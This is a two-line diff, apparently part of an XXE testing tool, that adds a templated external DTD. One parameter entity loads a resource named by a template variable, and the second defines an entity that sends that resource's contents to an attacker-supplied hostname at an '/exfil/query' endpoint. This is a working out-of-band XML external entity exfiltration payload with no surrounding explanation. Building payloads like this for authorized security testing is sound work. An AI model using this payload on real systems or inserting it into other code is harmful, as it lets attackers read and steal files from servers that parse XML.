@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "{{ entity }}">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM '{{ hostname }}/exfil/query?data=%data;'>">
